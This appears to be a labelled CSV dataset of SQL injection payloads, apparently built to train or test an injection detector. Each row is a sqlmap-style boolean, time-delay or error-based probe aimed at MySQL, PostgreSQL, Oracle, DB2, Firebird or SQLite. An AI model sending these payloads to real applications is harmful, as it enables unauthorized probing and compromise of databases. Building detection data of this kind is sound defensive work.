sentence,attack_type,len_payload,http_method
1'  )  )   )  and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (   ( 'pneh' like 'pneh,1,317,POST
1  )  )   )  and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (   ( 5368 = 5368,1,310,POST
"1  )  )   )  and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1,97,POST
"1'  )  )   )  and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1,98,POST
1'  )  )   )  and 8162 = 1687 and   (  (   ( 'tdyr' like 'tdyr,1,62,POST
"1  )  )   )  and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,125,POST
"1'  )  )   )  and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,126,POST
"1  )  )   )  and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,110,POST
"1'  )  )   )  and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,111,POST
"1  )  )   )  and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (   ( 1729 = 1729",1,114,POST
"1'  )  )   )  and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (   ( 'eflk' = 'eflk",1,118,POST
"1'  )  )   )  and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (   ( 'pufu' like 'pufu",1,121,POST
"1'  )  )   )  and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (   ( 'qgrt' = 'qgrt",1,118,POST
"1  )  )   )  and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (   ( 8738 = 8738",1,143,POST
"1'  )  )   )  and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (   ( 'ofko' = 'ofko",1,147,POST
"1'  )  )   )  and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (   ( 'peyy' = 'peyy",1,147,POST
"1'  )  )   )  and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (   ( 'zoxm' like 'zoxm",1,150,POST
1  )  )   )  and 8594 =  ( select 8594 from pg_sleep ( 5  )  )  --,1,66,POST
1'  )  )   )  and 8594 =  ( select 8594 from pg_sleep ( 5  )  )  --,1,67,POST
"1  )  )   )  and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1,89,POST
"1'  )  )   )  and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1,90,POST
1  )  )   )  and 8990 = 4775 and   (  (   ( 1894 = 1894,1,55,POST
1  )  )   )  and 9198 = 9198--,1,30,POST
1'  )  )   )  and 9198 = 9198--,1,31,POST
"1  )  )   )  and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,130,POST
"1'  )  )   )  and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,131,POST
1  )  )   )  and 9575 = 1640--,1,30,POST
"1  )  )   )  and 9660 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,121,POST
"1'  )  )   )  and 9660 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,122,POST
"1  )  )   )  and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,199,POST
"1'  )  )   )  and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,200,POST
"1  )  )   )  and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,154,POST
"1'  )  )   )  and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,155,POST
"1  )  )   )  and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (   ( 2997 = 2997",1,224,POST
"1'  )  )   )  and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (   ( 'kpsg' like 'kpsg",1,231,POST
"1'  )  )   )  and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (   ( 'tvar' = 'tvar",1,228,POST
"1'  )  )   )  and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (   ( 'xzcr' = 'xzcr",1,228,POST
"1  )  )   )  and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and   (  (   ( 7484 = 7484",1,181,POST
"1'  )  )   )  and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and   (  (   ( 'cenk' = 'cenk",1,185,POST
"1'  )  )   )  and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and   (  (   ( 'sjxp' like 'sjxp",1,188,POST
"1'  )  )   )  and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and   (  (   ( 'skdy' = 'skdy",1,185,POST
"1  )  )   )  and elt ( 1210 = 1210,sleep ( 5  )  )   and   (  (   ( 2341 = 2341",1,79,POST
"1'  )  )   )  and elt ( 1210 = 1210,sleep ( 5  )  )   and   (  (   ( 'acdu' = 'acdu",1,83,POST
"1'  )  )   )  and elt ( 1210 = 1210,sleep ( 5  )  )   and   (  (   ( 'aiuy' = 'aiuy",1,83,POST
"1'  )  )   )  and elt ( 1210 = 1210,sleep ( 5  )  )   and   (  (   ( 'mbxh' like 'mbxh",1,86,POST
"1'  )  )   )  and elt ( 2506 = 2383,2383 )  and   (  (   ( 'bjrj' = 'bjrj",1,73,POST
"1  )  )   )  and elt ( 3114 = 3114,sleep ( 5  )  )  #",1,53,POST
"1'  )  )   )  and elt ( 3114 = 3114,sleep ( 5  )  )  #",1,54,POST
"1  )  )   )  and elt ( 3132 = 1541,1541 )  and   (  (   ( 4258 = 4258",1,69,POST
"1  )  )   )  and elt ( 4249 = 4249,7259 )  and   (  (   ( 5030 = 5030",1,69,POST
"1'  )  )   )  and elt ( 4249 = 4249,7259 )  and   (  (   ( 'kbkz' = 'kbkz",1,73,POST
"1'  )  )   )  and elt ( 4249 = 4249,7259 )  and   (  (   ( 'kgdt' like 'kgdt",1,76,POST
"1'  )  )   )  and elt ( 4249 = 4249,7259 )  and   (  (   ( 'ujcx' = 'ujcx",1,73,POST
"1'  )  )   )  and elt ( 9041 = 6421,6421 )  and   (  (   ( 'ixxg' like 'ixxg",1,76,POST
"1'  )  )   )  and elt ( 9501 = 8427,8427 )  and   (  (   ( 'ahpp' = 'ahpp",1,73,POST
"1  )  )   )  and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (   ( 3977 = 3977",1,178,POST
"1'  )  )   )  and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (   ( 'ibrj' = 'ibrj",1,182,POST
"1'  )  )   )  and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (   ( 'lyem' like 'lyem",1,185,POST
"1'  )  )   )  and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (   ( 'txwf' = 'txwf",1,182,POST
"1  )  )   )  and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )   and   (  (   ( 1205 = 1205",1,155,POST
"1'  )  )   )  and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )   and   (  (   ( 'cfhi' like 'cfhi",1,162,POST
"1'  )  )   )  and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )   and   (  (   ( 'hllf' = 'hllf",1,159,POST
"1'  )  )   )  and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )   and   (  (   ( 'vpus' = 'vpus",1,159,POST
"1'  )  )   )  and make_set ( 6094 = 2929,2929 )  and   (  (   ( 'gkyo' = 'gkyo",1,78,POST
"1'  )  )   )  and make_set ( 7539 = 3946,3946 )  and   (  (   ( 'qbpo' = 'qbpo",1,78,POST
"1  )  )   )  and make_set ( 8403 = 8403,8899 )  and   (  (   ( 3036 = 3036",1,74,POST
"1'  )  )   )  and make_set ( 8403 = 8403,8899 )  and   (  (   ( 'llfp' = 'llfp",1,78,POST
"1'  )  )   )  and make_set ( 8403 = 8403,8899 )  and   (  (   ( 'oacz' = 'oacz",1,78,POST
"1'  )  )   )  and make_set ( 8403 = 8403,8899 )  and   (  (   ( 'zxon' like 'zxon",1,81,POST
"1  )  )   )  and make_set ( 8882 = 1593,1593 )  and   (  (   ( 7989 = 7989",1,74,POST
"1'  )  )   )  and make_set ( 9514 = 8668,8668 )  and   (  (   ( 'sgjj' like 'sgjj",1,81,POST
"1'  )  )   )  and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and   (  (   ( 'ejul' = 'ejul",1,291,POST
"1'  )  )   )  and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and   (  (   ( 'zxrb' = 'zxrb",1,291,POST
"1'  )  )   )  and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and   (  (   ( 'zxhn' like 'zxhn",1,294,POST
"1  )  )   )  and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and   (  (   ( 4127 = 4127",1,287,POST
1  )  )   )  and sleep ( 5 )  and   (  (   ( 6618 = 6618,1,56,POST
1'  )  )   )  and sleep ( 5 )  and   (  (   ( 'hwjy' = 'hwjy,1,60,POST
1'  )  )   )  and sleep ( 5 )  and   (  (   ( 'lbmp' = 'lbmp,1,60,POST
1'  )  )   )  and sleep ( 5 )  and   (  (   ( 'vbck' like 'vbck,1,63,POST
1  )  )   )  and sleep ( 5 ) #,1,30,POST
1'  )  )   )  and sleep ( 5 ) #,1,31,POST
"1  )  )   )  and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 )  and   (  (   ( 5199 = 5199",1,155,POST
"1'  )  )   )  and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 )  and   (  (   ( 'gwew' like 'gwew",1,162,POST
"1'  )  )   )  and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 )  and   (  (   ( 'vfnl' = 'vfnl",1,159,POST
"1'  )  )   )  and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 )  and   (  (   ( 'yqhk' = 'yqhk",1,159,POST
1  )  )   )  or  ( select * from  ( select ( sleep ( 5  )  )   ) sddo ) #,1,73,POST
1'  )  )   )  or  ( select * from  ( select ( sleep ( 5  )  )   ) sddo ) #,1,74,POST
1  )  )   )  or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and   (  (   ( 3332 = 3332,1,99,POST
1'  )  )   )  or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and   (  (   ( 'brhc' like 'brhc,1,106,POST
1'  )  )   )  or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and   (  (   ( 'jrpk' = 'jrpk,1,103,POST
1'  )  )   )  or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and   (  (   ( 'ljhc' = 'ljhc,1,103,POST
"1  )  )   )  or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and   (  (   ( 7589 = 7589",1,240,POST
"1'  )  )   )  or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and   (  (   ( 'crus' = 'crus",1,244,POST
"1'  )  )   )  or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and   (  (   ( 'qpuy' = 'qpuy",1,244,POST
"1'  )  )   )  or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and   (  (   ( 'vjkf' like 'vjkf",1,247,POST
"1  )  )   )  or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and   (  (   ( 4924 = 4924",1,251,POST
"1'  )  )   )  or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and   (  (   ( 'yiem' = 'yiem",1,255,POST
"1'  )  )   )  or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and   (  (   ( 'ymad' like 'ymad",1,258,POST
"1'  )  )   )  or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and   (  (   ( 'zeum' = 'zeum",1,255,POST
"1  )  )   )  or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,120,POST
"1'  )  )   )  or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,121,POST
"1  )  )   )  or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,129,POST
"1'  )  )   )  or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,130,POST
"1  )  )   )  or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and   (  (   ( 6312 = 6312",1,135,POST
"1'  )  )   )  or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and   (  (   ( 'dbsm' = 'dbsm",1,139,POST
"1'  )  )   )  or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and   (  (   ( 'ochr' like 'ochr",1,142,POST
"1'  )  )   )  or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and   (  (   ( 'xwhi' = 'xwhi",1,139,POST
1  )  )   )  or 4240 =  ( select 4240 from pg_sleep ( 5  )  )  --,1,65,POST
1'  )  )   )  or 4240 =  ( select 4240 from pg_sleep ( 5  )  )  --,1,66,POST
"1  )  )   )  or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and   (  (   ( 9255 = 9255",1,199,POST
"1'  )  )   )  or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and   (  (   ( 'gucd' = 'gucd",1,203,POST
"1'  )  )   )  or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and   (  (   ( 'narn' = 'narn",1,203,POST
"1'  )  )   )  or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and   (  (   ( 'ogwd' like 'ogwd",1,206,POST
"1  )  )   )  or 4915 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,117,POST
"1'  )  )   )  or 4915 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,118,POST
"1  )  )   )  or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and   (  (   ( 1164 = 1164",1,145,POST
"1'  )  )   )  or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and   (  (   ( 'ewwi' = 'ewwi",1,149,POST
"1'  )  )   )  or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and   (  (   ( 'gmbd' = 'gmbd",1,149,POST
"1'  )  )   )  or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and   (  (   ( 'xdui' like 'xdui",1,152,POST
"1  )  )   )  or 5356 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,174,POST
"1'  )  )   )  or 5356 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,175,POST
1  )  )   )  or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   and   (  (   ( 3919 = 3919,1,90,POST
1'  )  )   )  or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   and   (  (   ( 'mzqi' = 'mzqi,1,94,POST
1'  )  )   )  or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   and   (  (   ( 'odsl' like 'odsl,1,97,POST
1'  )  )   )  or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   and   (  (   ( 'ugrk' = 'ugrk,1,94,POST
"1  )  )   )  or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1,96,POST
"1'  )  )   )  or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1,97,POST
"1  )  )   )  or 7417 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,124,POST
"1'  )  )   )  or 7417 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,125,POST
"1  )  )   )  or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1,110,POST
"1'  )  )   )  or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1,111,POST
"1  )  )   )  or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (   ( 3504 = 3504",1,154,POST
"1'  )  )   )  or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (   ( 'bfrq' like 'bfrq",1,161,POST
"1'  )  )   )  or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (   ( 'iaud' = 'iaud",1,158,POST
"1'  )  )   )  or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (   ( 'nqam' = 'nqam",1,158,POST
"1  )  )   )  or 8156 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1,88,POST
"1'  )  )   )  or 8156 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1,89,POST
"1  )  )   )  or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and   (  (   ( 9802 = 9802",1,149,POST
"1'  )  )   )  or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and   (  (   ( 'raus' = 'raus",1,153,POST
"1'  )  )   )  or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and   (  (   ( 'vjhw' like 'vjhw",1,156,POST
"1'  )  )   )  or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and   (  (   ( 'zfrs' = 'zfrs",1,153,POST
"1  )  )   )  or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (   ( 4858 = 4858",1,121,POST
"1'  )  )   )  or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (   ( 'ckfn' like 'ckfn",1,128,POST
"1'  )  )   )  or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (   ( 'iari' = 'iari",1,125,POST
"1'  )  )   )  or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (   ( 'jueq' = 'jueq",1,125,POST
"1  )  )   )  or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (   ( 5340 = 5340",1,113,POST
"1'  )  )   )  or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (   ( 'bmzj' like 'bmzj",1,120,POST
"1'  )  )   )  or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (   ( 'istb' = 'istb",1,117,POST
"1'  )  )   )  or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (   ( 'tfnb' = 'tfnb",1,117,POST
"1  )  )   )  or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and   (  (   ( 8671 = 8671",1,94,POST
"1'  )  )   )  or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and   (  (   ( 'gbhd' = 'gbhd",1,98,POST
"1'  )  )   )  or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and   (  (   ( 'sqzl' = 'sqzl",1,98,POST
"1'  )  )   )  or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and   (  (   ( 'tpeo' like 'tpeo",1,101,POST
"1  )  )   )  or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",1,68,POST
"1'  )  )   )  or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",1,69,POST
"1  )  )   )  or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (   ( 8814 = 8814",1,142,POST
"1'  )  )   )  or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (   ( 'odkr' = 'odkr",1,146,POST
"1'  )  )   )  or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (   ( 'phdn' like 'phdn",1,149,POST
"1'  )  )   )  or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (   ( 'qvqf' = 'qvqf",1,146,POST
"1  )  )   )  or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (   ( 2952 = 2952",1,225,POST
"1'  )  )   )  or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (   ( 'akyc' = 'akyc",1,229,POST
